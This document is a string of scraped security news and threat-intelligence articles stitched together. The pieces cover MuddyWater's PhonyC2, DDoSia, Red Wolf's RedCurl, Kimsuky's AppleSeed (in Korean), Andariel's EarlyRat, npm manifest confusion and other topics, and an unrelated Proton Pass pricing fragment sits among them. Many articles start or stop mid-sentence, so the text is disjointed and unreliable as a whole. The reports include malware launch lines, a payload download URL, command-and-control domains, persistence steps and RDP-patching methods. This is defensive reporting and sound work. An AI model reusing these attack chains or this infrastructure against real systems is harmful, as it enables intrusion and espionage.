script file named utils.jse located in the C:\\intel\\utils\\ directory at startupCreate the directory c:\\intel\\utils\\ if it does not existChange the current directory to c:\\intel\\utils\\Decode a base64 blob and write it into utils.jseWhen the computer is rebooted, the run key causes the execution of the utils.jse scriptThe utils.jse script reads and executes the contents from the registry as seen in figure 23The PowerShell code in figure 25 connects to the C&C server to receive and execute a code that is similar to the below:The obfuscated payload was saved to a file named “data.sqlite” which is remarkably similar to the file name used in PhonyC2. In addition, the obfuscated payload has the same comma separated delimiter that is in the current PhonyC2 payloads, and the decoding routine is different from the most recent one.During our research we uncovered PhonyC2 servers with different ETag values or no ETag at all. We suspect that the occurrence of servers with same ETag value originate from duplication of the server image by the VPS provider. Therefore, this method might work occasionally but will be of value mostly for historical purposes.Passive DNS resolution of this IP is showing the domain 6nc110821hdb[.]co. This domain was also resolving to two other PowGoop servers:<3 letters><1 digit>[dot]6nc<date><optional 2 letters><optional incremented letter>[dot]coWe detected the following domain names that still have active hosts with passive DNS resolving.6nc051221a[.]co6nc051221c[.]co6nc110821hdb[.]co6nc060821[.]co6nc220721[.]coWe suspect that those domains represent infrastructure registered in 2021 by MuddyWater that are still active today.There are additional domains where we did not find active infrastructure, such as 6nc051221b[.]co and 6nc110821hda[.]co. In the past, the latter was resolving to known MuddyWater infrastructure. “6nc” could be interpreted as C&C (Six and C), which is an abbreviation to “Command and Control.”This IP address was also hosting various payloads. While we could not retrieve most of them, we were able to capture the directory listing of the server in Censys.In this instance of PhonyC2, MuddyWater decided to use Port 53 for the server, which is normally reserved for DNS use. This shows yet another attempt by MuddyWater to change their TTPs and conceal their malicious activity.This is also the third overlap of PhonyC2 intersecting with Microsoft’s reporting on MuddyWater activity.MuddyWater is continuously updating the C2 and changing TTPs to avoid detection, as can be seen throughout the blog, and in the investigation of the leaked code of PhonyC2.The part of the URL that is marked in red has been changed since PhonyC2 V6, the use of UUIDs has been changed, and the “go” extension was added. The second part of the URL in green has not been changed from the V6 code.While the encoded payload (green) looks similar to what we have seen in V6, MuddyWatter added a benign HTML code (red) to further conceal their activities. In PhonyC2 V6, the server response was solely the encoded payload without any HTML. Furthermore, the server’s location of the IP address 195.20.17[.]44 is in Israel, and we suspect this location was chosen on purpose to conceal network traffic in a targeted attacks against Israeli organizations.Samples of files generated by the framework (those are non-exhaustive):© 2023 Deep Instinct.

After that date, the product will have a regular price of $3.99.Subscribers to Proton Unlimited, Business, Visionary, or Family plans, will get the premium version of Proton Pass without an additional charge.The Proton team has promised to release desktop versions of Proton Pass for Windows and macOS, but these are unavailable at this time."

As of April 19, 2023, the ZIP included the following files: To execute these payloads, the client ID text file must be placed in the same folder as the payloads to limit unauthorized execution by security analysts or other \"intruders.\"The DDoSia client launches a command line prompt that lists the targets fetched by the project's C2 server in encrypted form and lets members contribute to generating garbage requests directed at them.Sekoia reverse-engineered the Windows 64-bit executable and found that it's a Go binary, using AES-GCM encryption algorithms to communicate with the C2.The C2 sends the target ID, host IP, request type, port, and other attack parameters in encrypted form to the DDoSia client, which is locally decrypted.Sekoia collected data regarding some targets sent by the DDoSia C2 between May 8 and June 26, 2023, and found that those targeted were mostly Lithuanian, Ukrainian, and Polish, accounting for 39% of the project's total activity.This focus of attacks is tied to these countries' public declarations against Russia, but in general, NoName057(16)'s targets appear to be NATO countries and Ukraine.During the mentioned period, DDoSia targeted a total of 486 different websites, and those receiving most of the malicious traffic were:NoName057(16) targeted educational platforms in May and early June, likely to disrupt the ongoing exams.Also, although DDoSia typically sets an average of 15 daily targets, on June 24, it focused all its firepower on the Wagner sites, treating this case as urgent.In conclusion, the DDoSia project continues to grow and has reached a large enough size to cause significant problems to its targets."

      "text": " Reporter, Infosecurity MagazineJapan finds itself in the crosshairs of many threat actors for both cyber espionage and financially motivated campaigns, a new report by Rapid7 has found.In the new research paper, Japan and Its Global Business Footprint: The Cyberthreat Landscape Report, published on June 28, 2023, Rapid7 found that the East Asian nation is on the radar of three of the four countries typically sources of state-sponsored threats: China, North Korea and Russia.The report also found that the manufacturing industry reported 32.5% of all ransomware attacks in the first half of 2022. By comparison, only 7.9% came from the healthcare industry during the same period.According to Paul Prudhomme, the head of the threat intelligence advisory at Rapid7, “Japanese manufacturing organizations are uniquely susceptible to cyber-attacks for two main reasons: on the one hand, they have deep ties with supply chains across the world, meaning they are useful targets; and on the other hand, they practice just-in-time production, which means they have barely any stocks and makes their operational processes significantly vulnerable.”The report also found that, since the most prominent Japanese companies have a global presence worldwide, with recognizable brands, especially in manufacturing, automotive and technology, the compromises of Japanese parent companies often originate from their overseas subsidiaries or affiliates.“Threat actors can then move laterally back to the parent company's systems back in Japan,” Prudhomme added.An example of this type of lateral movement occurred with Panasonic when its Indian branch experienced a data disclosure extortion incident in October 2020 and its Canadian branch was also targeted in February 2022.Also, when Nissan Canada Finance (NCF), which finances the purchase or lease of cars from Nissan, Infiniti and Mitsubishi dealers, received a ransom demand in December 2017.Chinese-affiliated groups used similar tactics but in a broader range of industries. In late 2021, for instance, Earth Tengshe (also known as Bronze Riverside), a subset of Chinese APT10, targeted overseas subsidiaries and suppliers of Japanese manufacturing, engineering, electronics, automotive, energy, and technology companies to allegedly gain access to the parent companies in Japan.Additionally, another state-sponsored threat actor has recently been observed targeting Japanese organizations from Vietnam.“The Vietnamese APT32, also known as OceanLotus, has demonstrated a special interest in the targeting of foreign competitors of Vietnam’s budding automotive industry. An anonymous official at one of the largest Japanese automotive manufacturers reportedly confirmed in 2019 that APT32 had targeted that company and its overseas operations. Security researchers observed that APT32 had created domains to spoof that automotive manufacturer’s legitimate infrastructure as an attack vector,” reads the report.These threats are particularly concerning, since Japan has a long reputation of falling behind in terms of cybersecurity policies, both in the private and public sectors, Sabeen Malik, VP of Global Government Affairs and Public Policy at Rapid7, told Infosecurity.“Japan lags behind other advanced nations in cybersecurity. The International Institute for Strategic Studies placed Japan at the bottom of its three-scale ranking in a June 2021 report. The London-based think tank cited the country's weak cybersecurity in public and private sectors, inducing its ability to keep track of malicious intrusion attempts and lack of a legal framework to launch counterattacks. It’s not relaxed, but not adapted to deal with cyberattacks in the way they happen, especially to country infrastructure,” Malik said.Japan is often overlooked in the cyber threat intelligence English-speaking literature despite being the world’s third-largest economy, after the US and China.Prudhomme said: “With this new report, Rapid7 hopes to offer a one-stop shop that gives a broad, comprehensive perspective on the Japanese threat landscape in English.”"

The technique became particularly popular among threat actors during the pandemic with the advent of mass home working.“This comes as no surprise; exposed remote services, including VPN, Citrix, TeamViewer or RDP, represent one of the most common methods of enabling initial access onto a targeted network, or establishing persistence,” the report explained.“We have observed significant threat actor interest in identifying exposed RDP servers, which has resulted in a flourishing ecosystem of cyber-criminal activity in identifying, exploiting, then selling RDP accesses onto interested third parties.”The most common access type advertised by these initial access brokers (IABs) was RDP, which accounted for 24% of intelligence updates published by ReliaQuest in the reporting period. RDP access was also the most expensive type on offer, with an average price of $1000.The report also revealed:“Criminals are using any means at their disposal to infiltrate organizations, and the exploitation of remote services continues to be the easiest way in. It’s essential for organizations to adequately monitor and secure these,” argued ReliaQuest SVP of security operations, Mike McPherson.“Ransomware remains the biggest risk facing business in 2023, and the last quarter saw more victims than ever before. Utilizing malware such as SocGholish has made their efforts more potent, which is why keeping abreast of the latest developments in tactics, techniques and procedures (TTPs) of ransomware activity, in addition to tracking groups known to be targeting your sector, is the best way to stay ahead of the curve from this pernicious activity.”"

      "text": " Freelance JournalistCharming Kitten, a threat actor believed to operate from Iran, has been found to be evolving its PowerStar backdoor malware alongside sophisticated spear-phishing techniques.“Charming Kitten sought to limit the risk of exposing their malware to analysis and detection by delivering the decryption method separately from the initial code and never writing it to disk,” explained Volexity researchers Ankur Saini and Charlie Gardner.“This has the added bonus of acting as an operational guardrail, as decoupling the decryption method from its command-and-control (C2) server prevents future successful decryption of the corresponding POWERSTAR payload.”The updated malware relies on the InterPlanetary File System (IPFS) and publicly accessible cloud hosting for its decryption function and configuration details.At the same time, Charming Kitten has been observed moving away from its previous cloud-hosting preferences (OneDrive, AWS S3, Dropbox) and opting for privately hosted infrastructure (Backblaze and IPFS). “It is possible that the group regards this as less likely to lead to their tools being exposed or that these other providers are less likely to act against their accounts and infrastructure,” Saini and Gardner explained.The latest version of PowerStar offers remote execution of PowerShell and CSharp commands, persistence through various methods, dynamic configuration updates, multiple C2 channels, system reconnaissance and monitoring of established persistence mechanisms.According to Volexity, the updated malware highlights Charming Kitten’s ongoing efforts to refine its techniques and evade detection, emphasizing the need for robust cybersecurity measures to counter sophisticated threats.“The general phishing playbook used by Charming Kitten and the overall purpose of POWERSTAR remain consistent,” reads the advisory. “This suggests that Charming Kitten is successful enough not to warrant modifying these aspects of their operations.”"

And until any attack is made in the wild by a real-world attacker against a real-world victim, it’s really zero risk,” Grimes added.Because of this, the security expert warned that anyone using Metior should remember that what it predicts as a particular risk or likelihood of a specific attack does not yet equate to real-world risk. “Ability to do something doesn’t equate to real risk by itself. Still, I applaud what Metior has done in trying to better estimate potential side-channel success rates. It’s good work.”"

      "text": " Freelance JournalistCI/CD pipelines are essential in modern software development, enabling seamless and efficient integration and deployment processes. However, relying on secrets such as private keys and passwords for authentication purposes has made them prime targets for cyberattacks. “The virtual cloud environment relies on software, making development and delivery a crucial component of providing services in the cloud,” commented Dr. Ethan Givens, NSA’s technical director of critical & emerging technologies. “Failure to effectively defend the CI/CD pipeline can provide an attack vector that circumvents security policies and products.”The guidelines highlight three key threat scenarios: MCAs acquiring developer’s credentials for accessing a Git repository service, supply chain compromise of an application library or container image in a CI/CD pipeline and supply chain compromise of a CI/CD environment that modifies configurations or injects malicious dependencies.The document then recommends corresponding mitigations for each. These include minimizing the use of long-term credentials, implementing two-person rules (2PR) for code updates, securing user accounts and enforcing least-privilege policies for CI/CD access. Additionally, the guidelines emphasize the importance of secure code signing, network segmentation, regular vulnerability scanning and integrating security measures throughout the CI/CD pipeline.By implementing these recommendations, organizations can significantly enhance the security posture of their CI/CD environments, reducing the risk of unauthorized access, supply chain compromise and code injection attacks."

      "text": " --ListenShareThe cyber spies who had been on hiatus since 2022 make a surprising comeback. Red Wolf has been spotted penetrating company infrastructures for espionage purposes. By slowly moving forward in the compromised environments and not drawing much attention, the group managed to stay invisible for up to six months.BI.ZONE Cyber Threat Intelligence team has detected a new campaign by Red Wolf, a hacker group that specializes in corporate espionage. Similar to its previous campaigns, the group continues to leverage phishing emails to gain access to the target organizations. To deliver malware on a compromised system, Red Wolf uses IMG files containing LNK files. By opening such a file an unsuspecting victim runs an obfuscated DLL file, which in its turn downloads and executes RedCurl.FSABIN on the victim's device. This enables the attackers to run commands in the compromised environment and transfer additional tools for post-exploitation.Key findingsCampaignBI.ZONE Cyber Threat Intelligence team has unearthed a new campaign by the Red Wolf group (aka RedCurl) that has been active at least since June 2018 in Russia, Canada, Germany, Norway, Ukraine, and the United Kingdom.The detected file (fig. 1) is an optical disk image. Once opened, it mounts onto the compromised system.The disk image contains an LNK file and a hidden folder #TEMP (fig. 2). The folder contains several DLL files, and only one of them has malicious content.Opening the LNK file triggers the execution of rundll32 with the following parameters:rundll32.exe #temp\\mKdPDaed.dll,ozCutPromoThe DLL file opens a web page (fig. 3).After that, RedCurl.FSABIN gets downloaded from https://app-ins-001.amscloudhost[.]com:443/dn01 and stored at C:\\Users\\[user]\\AppData\\Local\\VirtualStore\\ under the name chrminst_[computer name in base64].exe. The strings in the file are encrypted with AES-128 CBC. The first part of the password for the key can be found directly in the malware sample, while the second one can be retrieved from the command line, for instance:C:\\Users\\[redacted]\\AppData\\Local\\VirtualStore\\chrminst_[redacted].exe DOFBBdXC5DmPCTo achieve persistence in the compromised system, a task named ChromeDefaultBrowser_Agent_[computer name in base64] is created in the Windows Task Scheduler.The backdoor uses Windows API to gather information on the number of processors, memory size, storage capacity, as well as information on the amount of time that passed since the launch of the operating system before the malware sample being launched. This checkup is needed to identify a virtual environment and bypass respective security and analysis tools. Once the checkup is completed, the backdoor sends information about the compromised system to the command-and-control server. This information includes the username, the computer name, the domain name, a list of files and folders in Program Files, Desktop, and AppData\\Local, and the unique identifier. After that, the backdoor downloads the DLL and executes its exported function (in this case, yDNvu).ConclusionsDespite the widely known attack techniques, Red Wolf still manages to bypass traditional defenses and minimize the likelihood of detection. By not drawing much attention, the group is able to remain unnoticed in the compromised infrastructure for a long time and achieve its goals.How to detect the traces of Red WolfMITRE ATT&CKIndicators of compromise----BI.ZONE--3BI.ZONE--1BI.ZONE--BI.ZONE--1Forrest KaslerinPosts By SpecterOps Team Members--Christopher Elce--ZeusCybersecinILLUMINATION--2Daniel Edwards--Alex TeixeirainDetect FYI--Haadi Mohammed--HelpStatusAboutCareersBlogPrivacyTermsText to speechTeams"

AppleSeed 유포 과정에서는 주로 문서 파일들의 확장자를 위장한 WSF나 JS와 같은 스크립트가 사용된다. 해당 악성코드를 실행하면 악성코드 실행과 함께 정상 문서 파일이 함께 실행되어 사용자는 정상적인 문서 파일을 실행한 것으로 인지할 수 있다.디코딩된 악성코드는 AppleSeed이며 다음과 같은 인자를 이용해 실행시켰다. 인자들 중에서 “/I”에 입력되는 “123qweASDZXC”는 AppleSeed 실행 시 필요한 조건으로서 해당 인자가 사용되지 않을 경우 AppleSeed는 동작하지 않는다.공격자는 이후 AppleSeed를 이용해 다양한 추가 악성코드들을 설치하였다. 여기에는 과거부터 Kimsuky 그룹이 꾸준히 사용하고 있는 인포스틸러, RDP Patcher 악성코드와 Ngrok가 있다. 이외에도 공격자가 원격으로 감염 시스템을 제어할 수 있도록 크롬 원격 데스크톱을 설치하는 로그도 함께 확인된다.AppleSeed와 관련된 상세한 분석 정보는 다음 보고서를 참고하면 된다. 현재 공격에서 사용된 AppleSeed는 두 개이며 모두 C&C 서버와의 통신 HTTP 프로토콜을 사용한다. 두 개의 AppleSeed 중 하나는 실행 시 다음과 같이 인자가 필요한 형태이다.Kimsuky 공격 그룹은 AppleSeed 설치 이후 다양한 악성코드들을 추가적으로 설치하는 편이다. 대표적으로 정보 탈취 악성코드가 있는데, 과거에는 구글 크롬 웹 브라우저를 대상으로 계정 정보를 수집하여 다음 경로에 텍스트 파일 형태로 저장하는 인포스틸러가 사용되었다.최근에는 조금 더 업그레이드된 형태로서 구글 크롬 외에 마이크로소프트 엣지나 네이버 웨일 웹 브라우저에 저장되어 있는 계정 정보를 탈취하는 악성코드가 사용되고 있다. 참고로 해당 악성코드는 작년에 최초로 확인되었으며 유사 유형이 아닌 동일한 악성코드가 지속적으로 사용되고 있는 점이 특징이다.공격자는 해당 경로에 텍스트 파일 형태로 저장된 사용자의 계정 정보들을 AppleSeed나 다른 악성코드를 이용해 탈취할 것으로 추정된다.일반적인 윈도우 환경에서는 한 대의 PC에 하나의 RDP 접속만 허용된다. 이에 따라 공격자가 감염 시스템의 계정 정보를 알고 있다고 하더라도 만약 기존 사용자가 로컬에서 작업 중이거나 또는 사용자가 RDP를 이용해 현재 시스템에 접속하여 사용하고 있을 경우에는 사용자의 인지 없이 RDP 연결이 불가하다. 현재 사용자가 작업 중인 환경에서 공격자가 RDP 연결을 시도할 경우 기존 사용자는 로그오프되기 때문이다.이를 우회하기 위한 방식으로는 Remote Desktop Service의 메모리를 패치하여 다중 원격 데스크톱 접속을 허용하게 하는 방식이 있다. 대표적으로 Mimikatz도 ts::multirdp 명령을 통해 이러한 기능을 지원한다. ts::multirdp 명령을 사용하면 현재 실행 중인 Remote Desktop Service 즉 termsrv.dll을 로드한 svchost.exe에서 해당 DLL의 주소를 구한 후 특정 바이너리 패턴을 검색한다. 이는 윈도우 버전마다 다르기 때문에 각각의 버전에 따라 검색 패턴이 정의되어 있다. 정의된 패턴이 존재하면 이를 새로운 바이너리 패턴으로 패치하며 패치 이후부터는 다중 RDP가 가능하다.Kimsuky 그룹은 다중 RDP를 위한 메모리 패치를 전담하는 악성코드를 지속적으로 사용하고 있다. 현재 확인된 악성코드는 x64 윈도우 아키텍처에 대해서만 동작하며 작년부터 공격에 사용되고 있다. 과거 RDP Patcher 악성코드는 PDB 정보가 존재하지 않았으며, DLL 이름 “hp_aux_multirdp.dll”만 확인이 가능하였다. 현재 확인된 악성코드는 다음과 같은 PDB 정보를 가지고 있는 것이 특징이다.검색 패턴 및 패치 패턴은 미미카츠의 소스 코드와 유사한데, 차이점이 있다면 Windows XP 버전도 지원한다는 점이 있다. 다음은 각 윈도우 버전에서 검색 패턴 및 패치할 패턴 목록이다.Ngrok는 터널링 프로그램으로서 외부에서 NAT 환경 내부에 존재하는 시스템에 접속할 수 있게 노출시켜 주는 도구이다. Kimsuky 공격 그룹은 공격 과정에서 Ngrok를 자주 사용하고 있다. 직접적인 사용 사례는 확인되지 않지만 감염 시스템에 대한 원격 데스크톱 접속을 위한 것이 목적으로 보인다.Kimsuky 공격 그룹은 감염 시스템에 대한 제어를 획득하기 위해 원격 데스크톱 서비스를 사용하는 경향이 있다. 이에 따라 RDP Wrapper나 위의 RDP Patcher 등 RDP와 관련된 다양한 악성코드들이 자주 사용된다. 하지만 감염 시스템이 NAT 환경 내부에 존재할 경우 IP 및 계정 정보를 알고 있다고 하더라도 원격 데스크톱으로 접속이 불가하다. Kimsuky 공격 그룹은 이러한 문제를 해결하기 위해 Ngrok를 사용하는 것으로 보이며, 실제 확인된 공격 사례 다수에서 Ngrok가 함께 확인되고 있다.공격자는 다음과 같은 명령을 AppleSeed에 전달하여 외부에서 Ngrok를 설치하였다. 현재 네이버 메일 URL에서는 다운로드가 불가하지만 명령 실행 시점과 다운로드 경로를 통해 Ngrok가 업로드되었던 주소일 것으로 추정된다. 참고로 Ngrok가 ProgramData 폴더 내에 svchost.exe라는 이름으로 설치되는 사례는 과거부터 꾸준히 확인되고 있다.Kimsuky 공격 그룹은 AppleSeed나 Meterpreter와 같은 백도어 악성코드를 이용해 감염 시스템에 대한 제어를 획득한 이후에도 GUI 환경의 원격 제어를 위해 추가적인 악성코드들을 설치하였다. 만약 윈도우의 RDP 프로토콜을 이용할 경우에는 위에서 다룬 악성코드들이 사용될 것이며 다수의 공격 사례에서 RDP Wrapper를 추가적으로 설치하는 사례도 존재한다.구글은 크롬 원격 데스크톱(Chrome Remote Desktop)이라는 기능을 지원한다. 특정 시스템에 사용자의 계정으로 원격 데스크톱 프로그램을 설치할 경우 다른 시스템에서 크롬 웹 브라우저로 해당 시스템에 대한 원격 제어 기능을 제공하는 기능이다. 일반적으로 원격 제어 대상이 되는 시스템의 크롬 브라우저에서 원격 제어를 설정하는 방식이 대부분이겠지만 크롬은 직접 원격 제어 호스트 프로그램을 설치하는 방식도 지원한다.예를 들어 원격 제어 대상 장비에 크롬 원격 제어 호스트 프로그램을 설치하고 다음과 같은 인자들과 함께 커맨드 라인 명령을 실행할 수 있다. 해당 명령은 크롬 웹 브라우저에서 로그인한 이후 생성할 수 있으며 인증 코드는 매번 변경된다.위와 같은 명령을 실행한 이후 PIN 번호를 입력하면, 이후 크롬 웹 브라우저에서 원격 제어 대상 장비가 온라인 상태인 것을 보여준다. 해당 장비에 접속하고 크롬 원격 제어 호스트 실행 시 입력했던 PIN 번호를 입력하면 크롬 웹 브라우저에서 원격 제어가 가능하다.공격자는 먼저 AppleSeed에 다음과 같은 파워쉘 명령을 전달하여 크롬 원격 데스크톱 호스트 인스톨러를 설치하였으며, 설치가 끝난 이후에는 크롬 원격 데스크톱 호스트를 제어하는 23.bat 파일을 설치하였다.23.bat 파일은 위의 크롬 원격 데스크톱 실행 명령과 유사하며 “–pin” 인자가 함께 사용되어 커맨드 라인 상으로도 추가적인 작업 없이 동작할 수 있도록 하였다. 공격에 사용된 인증 코드는 공격자의 구글 계정으로 제작된 것이며, 공격자는 크롬 웹 브라우저에서 감염 시스템을 제어할 수 있을 것이다.Kimsuky 공격 그룹은 국내 사용자들을 대상으로 지속적으로 스피어 피싱 공격을 수행하고 있다. 주로 메일의 첨부 파일로 문서 파일을 위장한 악성코드를 유포하는 방식이며 사용자가 이를 실행할 경우 현재 사용 중인 시스템에 대한 제어가 탈취될 수 있다.Kimsuky 공격 그룹은 감염 시스템에 대한 제어를 탈취하기 위해 AppeSeed나 Meterpreter 그리고 VNC 악성코드들을 사용하고 있으며, 윈도우 시스템에 기본적으로 존재하는 RDP 원격 데스크톱 서비스를 악용하기도 한다. 최근에는 원격 제어를 위해 구글 크롬의 원격 데스크톱 기능을 악용하는 사례도 확인되고 있다.사용자들은 의심스러운 메일을 받게 된다면 첨부 파일의 실행을 지양해야 하며, V3를 최신 버전으로 업데이트하여 악성코드의 감염을 사전에 차단할 수 있도록 신경 써야 한다.파일 진단– Downloader/BAT.Agent (2023.06.27.03)– Backdoor/Win.AppleSeed.R588872 (2023.06.27.02)– Trojan/Win.Akdoor.R470485 (2022.02.05.00)– Trojan/Win.Generic.R577010 (2023.05.15.02)행위 진단– Execution/MDP.Regsvr32.M4470– Execution/EDR.Regsvr32.M11168 (EDR)– Execution/MDP.Regsvr32.M11169 (MDS)IOCMD5– 80f381a20d466e7a02ea37592a26b0b8 : AppleSeed (AdobeService.dll)– b6d11017e02e7d569cfe203eda25f3aa : AppleSeed (EastSoftUpdate.dll)– d2eb306ee0d7dabfe43610e0831bef49 : InfoStealer– d6a38ffdbac241d69674fb142a420740 : RDP Patcher– 946e1e0d2e0d7785d2e2bcd3634bcd2a : 크롬 원격 데스크톱 런쳐 (23.bat)다운로드 주소– hxxps://bigfile.mail.naver[.]com/download?fid=lekqm6cmwzu9hqujfovzfq2lfamjkogzkqgrkoewkoeqkabjkxmlkaulfqula3ydaxgrp63cm4u9mopvmqbmpxm/kzk0kzewkxbmfqvxp2== : NgrokC&C– hxxp://getara1.mygamesonline[.]org/ : AppleSeed (AdobeService.dll)– hxxp://pikaros2.r-e[.]kr/ : AppleSeed (EastSoftUpdate.dll)[필수] 개인정보 수집 및 이용 동의Δ[필수] 개인정보 수집 및 이용 동의Δ"

      "title": "Kaspersky crimeware report: Andariel’s mistakes and EasyRat malware | Securelist",
      "text": " Solutions for:ThreatsCategories28 Jun 2023\n  minute read\t\t\t\t\t\t\t\tTable of ContentsAuthorsWhile on an unrelated investigation recently, we stumbled upon this campaign and decided to dig a little bit deeper. We discovered a previously undocumented malware family and an addition to Andariel’s set of TTPs.Andariel infects machines by executing a Log4j exploit, which, in turn, downloads further malware from the C2 server. Unfortunately, we were unable to catch the first piece of malware they downloaded, but we did see that exploitation was closely followed by the DTrack backdoor being downloaded.From this point on, things got rather interesting, as we were able to reproduce the commands the attackers executed. It quickly became clear that the commands were run by a human operator, and judging by the amount of mistakes and typos, likely an inexperienced one. For example:Note how “Program” is misspelled as “Prorgam” . Another funny moment was when the operators realized they were in a system that used the Portuguese locale. This took surprisingly long: they only learned after executing cmd.еxe /c net localgroup as you can see below:We were also able to identify the set of off-the-shelf tools Andariel that installed and ran during the command execution phase, and then used for further exploitation of the target. Below are some examples:We first noticed a version of EarlyRat in one of the aforementioned Log4j cases and assumed it was downloaded via Log4j. However, when we started hunting for more samples, we found phishing documents that ultimately dropped EarlyRat. The phishing document itself is not that advanced as can be seen below:Once macros are enabled, the following command is executed:Oddly enough, the VBA code pings a server associated with the HolyGhost / Maui ransomware campaign.EarlyRat, just like many other RATs (remote access Trojans), collects system information upon starting and sends it to the C2 using the following template:As can be seen above, there are two different parameters in the request: “id” and “query”. Next to those, the “rep0” and “page” parameters are also supported. They are used in the following cases:In terms of functionality, EarlyRat is very simple. It is capable of executing commands, and that is about the most interesting thing it can do. There is a number of high-level similarities between EarlyRat and MagicRat. Both are written using a framework: QT is used for MagicRat and PureBasic, for EarlyRat. Also, the functionality of both RATs is very limited.Despite being an APT group, Lazarus is known for performing typical cybercrime tasks, such as deploying ransomware, which makes the cybercrime landscape more complicated. Moreover, the group uses a wide variety of custom tools, constantly updating existing and developing new malware.Focusing on TTPs as we did with Andariel helps to minimize attribution time and detect attacks in their early stages.

      "title": "The Current State of Business Email Compromise Attacks",
      "text": " Attackers use various tactics to access sensitive information, such as email account compromise and using a legitimate email address to initiate the attack.BEC attacks can occur in various ways, using a variety of methods. But what makes them different and arguably more dangers is they are driven by intent. BED attacks target specific individuals within organizations and have messages that are often personalized to the intended victim.Running a business is complex, and with so many moving parts, attackers can attempt different angles, targeting C-level executives, shipping departments, billing, or IT.This type of attack involves a threat actor impersonating a C-suite individual, such as the CEO or CFO of a company. The attacker would then email an individual in the finance department requesting a fund transfer.The transferred funds would be directed to an account controlled by the attacker.To make the attack more effective, the threat actor may have researched their targets and attempted to match their language, terminology, style, and email address as closely as possible.If the target does not pay attention, they may fall for the ruse and transfer the funds.In a more insidious attack, an attacker may compromise an existing employee’s email account from the inside. With access to this compromised account, the attacker can then request payments to vendors that are accounts controlled by the attacker.For instance, Joe in the purchasing department could have their account compromised. His email could then send numerous requests to billing that seem like standard payment requests to vendors, usually for smaller amounts.Since the request comes from a trusted account, billing may not scrutinize it closely and pay the vendor. Additionally, larger companies may need more resources to audit every request, resulting in many missed requests.An attacker may email a company requesting payment of an invoice, insisting that it is overdue for services rendered.An overworked billing department may not think twice about paying it, especially if the email and invoice look legitimate and mimic those of prior vendors.In addition, an attached PDF may contain malware, allowing for an account compromise attack.While most attacks in this area have focused on the vendor supply chain, this attack targets many people's natural unease when dealing with legal matters.A supposed attorney contacts the target and requests payment for a settlement or threatens legal action if payment is not received.Rather than risk being on the wrong side of the law or embroiled in a lawsuit, some employees may pay the requested funds to avoid issues. Cases can be extremely costly, so paying the lower amount may be an attractive option to make the issue disappear without engaging expensive company lawyers.A typical attack targeting human resource employees involves data theft. The objective is to gather personal and sensitive information about individuals in positions of power for reconnaissance purposes.With this information, an attacker can launch more sophisticated schemes, such as CEO Fraud, by leveraging the intimate details they have acquired to make their emails seem more believable.BEC attacks are a type of social engineering attack that takes place over email. The attacker falsifies an email message to trick the victim into performing some action.In these situations, the goal is not only to have the target perform the requested task but also to compromise their computer for future attacks against the business. A compromised computer can quickly provide private information about the employee and the company.For instance, with a compromised email account, an attacker could see that a company works with a specific vendor. The attacker could then craft an email from the compromised account and send it to the billing department, requesting payment to the same vendor but to an attacker-controlled account.So, what can a company do to protect against this type of theft? Along with providing in-depth education on the types of attacks and social engineering required to carry out this theft, a company needs a robust security infrastructure if an account is compromised. This includes implementing strong password policies to prevent the use of compromised credentials in attacks.The tool extends the functionality of Group Policy, and simplifies the management of fine-grained password policies while offering realtime dynamic end user feedback at password creation.As more and more business moves online, Business Email Compromise (BEC) attacks will become increasingly more common and challenging to detect.Organizations want to avoid being on the receiving end of such an attack, especially one that can result in a huge finanical loss as 95% of all breaches are financially driven.By learning about the types of attacks and taking preventative measures, you can ensure your business is better protected."

      "title": "NPM ecosystem at risk from “Manifest Confusion” attacks",
      "text": " The NPM (Node Package Manager) registry suffers from a security lapse called \"manifest confusion,\" which undermines the trustworthiness of packages and makes it possible for attackers to hide malware in dependencies or perform malicious script execution during installation.NPM is a package manager for the JavaScript programming language and the default for the widely used Node.js environment. The package manager helps project owners automate the installation, upgrading, and configuration of software packages hosted on the \"npm registry\" database at npmjs.com.In 2020, the platform was acquired by Microsoft through GitHub, and today, it is estimated that over 17 million software developers worldwide are using it, downloading 208 billion packages per month.The NPM registry is also immensely popular among developers as it contains a wide assortment of packages that can be used to extend an application's features without requiring additional development work.Manifest confusion occurs there is an inconsistency between a package's manifest information presented on the npm registry and the actual 'package.json' file in the tarball of the published npm package used when the package is installed.Both the manifest data submitted to NPM when publishing a package and the package.json contain information about the package name, version, and other metadata, such as scripts used in deployment, build dependencies, etc.The two are submitted separately to the npm registry, and the platform does not validate if they match, so their data could differ, and no one would know unless they scrutinize their contents.This allows a threat actor to modify the manifest data submitted with a new package to remove dependencies and scripts so that they do not appear in the NPM registry. However, these scripts and dependencies still exist in the package.json file and will be executed when the package is installed.This \"manifest confusion\" is illustrated in the image below, showing that there are zero dependencies listed on NPM for Clarke's proof-of-concept package, even though there are dependencies listed in the package.json.The risks that arise from the \"manifest confusion\" inconsistency include cache poisoning, installation of unknown dependencies, execution of unknown scripts, and potentially also downgrade attacks.\"Manifest confusion also allows an attacker to include hidden install scripts too. These hidden scripts and dependencies won't show up on the npm website or in most security tools, even though they will be installed by the npm CLI.\"Unfortunately, the npm community and all major package managers, including npm@6, npm@9, yarn@1, and pnpm@7, are impacted by this problem.Unfortunately, this leads to a lack of trust in the NPM Registry as the dependencies, version numbers, and even package names may not be accurate.Instead, developers should manually read the package.json to determine version numbers, what dependencies will be installed, and what scripts will be executed.The engineer submitted a detailed HackerOne report that presented examples of the problem on March 9, 2023.On March 21, 2023, GitHub closed the ticket, responding that they were dealing with the issue internally. Still, they have yet to remediate the risks and have not communicated them to the npm community.Clarke mentions that due to npm's sheer size and the fact that it has been following this unsafe practice for many years, addressing this problem is far from trivial.Until GitHub forges a plan to deal with manifest confusion on npm, Clarke suggests that authors and maintainers of packages remove the reliance on manifest data and instead source all metadata apart from the name and version from 'package.json' files that are less prone to manipulation.Another protection measure would be to use a registry proxy between the package database and the npm client, which could implement additional checks and validations to ensure the consistency between the manifest data and the information in the package's tarball.BleepingComputer has contacted GitHub about the issue, and we will update this post as soon as we receive a response."

      "text": " The Brave team has announced that the privacy-centric browser will soon introduce new restriction controls allowing users to specify how long sites can access local network resources.Locally hosted resources can include images or files needed or used by web programs on your device. Other local resources could include access to devices on your network, such as NAS instances, locally hosted servers, shared network printer files, shared network device/computer data, etc.It is common for websites and local web apps to request access to local resources to fingerprint users or collect information about what software runs on a user's machine.Brave says all major modern browsers, including Chrome and Firefox, allow websites to request access to local resources and use them without restriction.Safari blocks these requests even when they come from secure public websites as a side-effect of its security measures rather than a specific design decision to stop this dangerous practice.\"Brave is the only browser that will block requests to localhost resources from both secure and insecure public sites, while still maintaining a compatibility path for sites that users trust,\" pledges the Brave team.\"Starting in version 1.54 (current is v1.52), Brave for desktop 